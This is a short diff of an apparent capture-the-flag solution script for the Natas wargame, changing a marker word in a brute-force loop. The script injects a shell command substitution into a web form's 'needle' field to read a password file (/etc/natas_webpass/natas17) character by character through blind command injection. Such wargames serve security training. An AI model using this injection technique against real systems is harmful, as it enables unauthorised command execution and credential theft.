@@ -29,10 +29,10 @@ for i in range(len(p)+1,length+1):
 	for c in (string.digits + string.uppercase + string.lowercase):
 		print c,
 		params = {}
-		params["needle"] = "$(grep -E ^" + p + c + " /etc/natas_webpass/natas17)hackers"
+		params["needle"] = "$(grep -E ^" + p + c + " /etc/natas_webpass/natas17)test"
 		req = urllib2.Request(url, data=urllib.urlencode(params))
 		page = urllib2.urlopen(req).read()
-		if (page.count("hackers") != 1):
+		if (page.count("test") != 1):
 			p += c
 			print p
 			break
